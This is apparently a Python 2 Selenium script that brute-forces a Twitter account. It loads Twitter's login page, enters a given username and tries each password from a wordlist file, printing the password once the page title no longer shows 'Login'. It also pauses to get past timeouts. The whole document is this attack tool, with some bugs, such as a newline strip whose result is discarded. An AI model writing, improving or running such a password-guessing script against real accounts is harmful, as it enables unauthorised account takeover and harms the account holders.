from selenium import webdriver as surucu
from sys import argv
import time

try:
	us = argv[1]
	paslist = open(argv[2], "r").readlines()
	print "[+] OK."
except:
	print "[!] python login_twiter.py <username> <password>"
	exit()

link = "https://twitter.com/login"



br = surucu.Firefox()
br.get(link)
br.find_element_by_class_name("js-username-field").send_keys(us)

say = 0
try:
	for password in paslist:
		try:
			password.replace("\n", "")
			br.find_element_by_class_name("js-password-field").send_keys(password)
			br.find_element_by_class_name("EdgeButtom--medium").click()
			baslik = br.title
			if not "Login" in baslik:
				print "-" * 20 + "Password Found...!" + "-" * 20
				print "username : {}\nPassword : {}Deneme sayisi : {}".format(us, password, say)
				print "-" * 58
				print "\nGoster gucunu...."
			else:
				print "number of tests :" + str(say) + " >>>>>>>>>>>>>Pass : " + password
				say += 1
		except:
			print "connect is time out. please wait to 1 minutes"
			time.sleep(62)
except:
	print "Hata"
#	try:
#		br.close()
#	except:
#		pass
	exit()
